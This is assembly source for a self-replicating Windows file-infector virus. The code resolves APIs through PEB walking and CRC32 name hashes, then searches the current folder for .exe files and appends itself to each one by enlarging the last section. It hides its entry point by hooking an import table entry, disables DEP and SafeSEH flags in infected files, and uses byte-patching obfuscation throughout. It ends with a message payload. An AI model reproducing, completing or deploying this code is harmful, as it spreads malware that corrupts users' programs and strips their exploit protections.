.486
.model  flat, stdcall
.code   Uki
include juli.inc
publicz juli_exe
        push    eax
        pushad
        push    PEB
        pop     esi
        mov     eax, fs:[esi]
        mov     eax, [eax]
        org     $ - 1
        inc     eax
        db      8
        add     eax, rExitProcess
        mov     dword ptr [esp + esi - (STACK_REG.LO32_EAX - STACK_REG.LO32_ESP)], eax
        xor     edx, edx
        call    a1
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        popad
        ret
a1:     push    fs:[edx]
        mov     fs:[edx], esp
        lods    dword ptr fs:[esi]
        mov     eax, [eax]
        org     $ - 1
        inc     eax
        db      e_lfanew - PEB
        mov     esi, dword ptr [eax + InMemoryOrderModuleList_Flink]
        lodsd
        mov     eax, [eax]
        mov     ebp, [eax][off_k]
        call    a2
        dd      0efc7ea74h
        dd      02519b15ah
        dd      0391ab6afh
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      0
a2:     pop     esi

;===========================================================================
;walk lists
;===========================================================================

import_next:
        mov     eax, dword ptr [ebp + IMAGE_DIRECTORY_ENTRY_EXPORT - IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
        mov     ebx, [ebp][eax]
        org     $ - 2
        db      5ch
        db      28h
        db      e_lfanew * 2
        add     ebx, ebp
 
export_next:
        mov     edi, [ebx]
        org     $ - 1
        db      7bh
        db      20h
        add     edi, ebp
        mov     edi, dword ptr [edi][edx * 4]
        stc
        sbb     eax, eax
        add     edi, ebp
        crc32
        not     eax
        cmp     [esi], eax
        je      resolve
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     export_next
        int     3

;===========================================================================
;resolve API address
;=====
;find exe files
;use enter to reduce stack a few dwords. ebp completes and align
;===========================================================================

resolve:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi]
        org     $ - 1
        db      e_lfanew
        db      57h
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, [eax]
        x       = 4
        org     $ - 1
        db      x
        mov     eax, x
        org     $ - x
        add     eax, ebp
        push    eax
        lodsd
        cdq
        cmp     byte ptr [esi], cl              ;db - CL not DL
        jne     import_next
        push    esp
        pop     esi
        enter   sizeof WIN32_FIND_DATA - sizeof IMAGE_DOS_HEADER.e_magic, 0 
        mov     edi, esp
        push    'e'
        push    'xe.*'
        mov     ecx, esp
        push    edi
        push    ecx
        call    esFindFirstFileA
        xchg    ebp, eax
        xor     ebx, ebx

open_file:
        pushad  
        push    ebx
        push    ebx
        push    3
        push    ebx
        push    3
        push    3
        lea     edx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        call    esCreateFileA
        push    eax
        push    eax
        push    ebx
        push    ebx
        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ebp
        push    eax
        push    ebx
        add     ebp, 1000h + 'u'                ;1!
        push    ebp
        push    ebx
        push    4
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebp
        push    ebx
        push    ebx
        push    2
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    a3
        pop     eax
        pop     eax
        pop     esp

scapesee:
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    dword ptr [esi]
        call    esSetFilePointer 
        call    esSetEndOfFile 
        call    dword ptr [esi]
        popad
        push    edi
        push    ebp
        call    esFindNextFileA
        test    eax, eax
        jnz     open_file
        int     3                               ;popx2-leave

;===========================================================================
;MZ and PE\0\0
;===========================================================================

a3:     push    fs:[ebx]
        mov     fs:[ebx], esp
        push    eax
        pop     ebp
        cmp     word ptr [eax], 'ZM'
        jne     scapesee
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], 'EP'
        jne     scapesee
        db      83h, 0c0h, 7fh                  ;add eax, sizeof impfill - optimised import data directory offset

;===========================================================================
;32-bit machine. GUI or CUI mode
;no appended data (virmark, attribute certificates, debug info, etc)
;====
;disable DEP
;===========================================================================

        test    byte ptr [eax - (sizeof impfill - (IMAGE_NT_HEADERS.FileHeader.Characteristics + 1))], 01
        jz      scapesee
        mov     cl, byte ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.OptionalHeader.Subsystem)]
        dec     ecx
        dec     ecx
        cmp     cl, 1
        jnbe    scapesee
        and     byte ptr [eax - (sizeof impfill - (IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics + 1))], 0f0h
        movzx   ecx, word ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.FileHeader.NumberOfSections)]
        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + ecx + ((sizeof IMAGE_NT_HEADERS - 7fh) - sizeof IMAGE_SECTION_HEADER) + IMAGE_SECTION_HEADER.SizeOfRawData]
        mov     ecx, dword ptr [esi] 
        add     ecx, dword ptr [esi + HALFPTR]
        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], ecx
        jne     scapesee

;===========================================================================
;set size
;===========================================================================

        mov     bh, 10h
        stc                                     ;set 1-byte
        adc     dword ptr [esp + sizeof STACK_REG + 14h], ebx

;===========================================================================
;infect exe
;always append to exe files
;increase last section and image size to contain the virus code
;===========================================================================

        mov     edx, dword ptr [esi]
        add     dword ptr [esi], ebx
        add     edx, dword ptr [esi - 4]
        add     dword ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)], ebx
        add     dword ptr [esi - (SECTION_ID + 4)], ebx
        lea     edi, dword ptr [ebp + ecx]
        push    ebx
        pop     ecx
        push    edi
        call    $ + 5

image_base:
        pop     esi
        sub     esi, offset image_base - offset juli_exe
        rep     movsb

;===========================================================================
;entrypoint obscuring
;hook first entry of a different import address table. no call/jmp points to it
;===========================================================================

        mov     ecx, [eax]
        org     $ - 1
        int     3
        org     $ - 1
        db      48h
        db      "a"
        mov     esi, [eax]
        org     $ - 1
        db      70h
        db      0b5h
        add     eax, 19h
        call    skip_codes
        cmp     esi, ecx
        jnb     skip_subim
        sub     ecx, esi

skip_subim:
        sub     ecx, dword ptr [eax + (sizeof IMAGE_NT_HEADERS - sizeof glosoli) + IMAGE_SECTION_HEADER.VirtualAddress]
        cmp     dword ptr [eax + 4], ecx
        org     $ - 1
        int     3
        org     $ - 1
        db      "h"
        jbe     sehscape
        add     ecx, dword ptr [eax + (sizeof IMAGE_NT_HEADERS - sizeof glosoli) + IMAGE_SECTION_HEADER.PointerToRawData]
        add     ecx, ebp
        ret

skip_codes:
        pop     ebx
        call    ebx
        mov     ecx, [ecx]
        org     $ - 1
        db      49h
        db      sizeof iat_tbl
        call    ebx
        add     edx, esi
        xchg    [ecx], edx
        sub     edx, esi
        pop     edi
        mov     [edi], edx
        org     $ - 1
        db      57h
        db      SECTION_ID * 3
        lea     edi, dword ptr [eax + (IMAGE_NT_HEADERS.OptionalHeader.MinorSubsystemVersion - 1) + 19h]
        xor     eax, eax
        stosd                                   ;disable SafeSEH
        stosd

sehscape:
        int     'h' - 'e'

publicz juli_end      
impfill db      7fh  dup ("u")
iat_tbl db      18h  dup ("k")
glosoli db      98h  dup ("i")
publicz juli_mi2
        db      1000h - ((offset juli_mi2 - offset juli_end) + (offset juli_end - offset juli_exe)) dup ("h")

publicz message
        xor     ebx, ebx
        call    skip_rain
        db      "I love you"

skip_rain:
        pop     ecx
        push    ebx
        push    708h                            ;twelve
        push    ebx
        push    ebx
        push    0ah
        push    ecx
        push    STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
end     juli_exe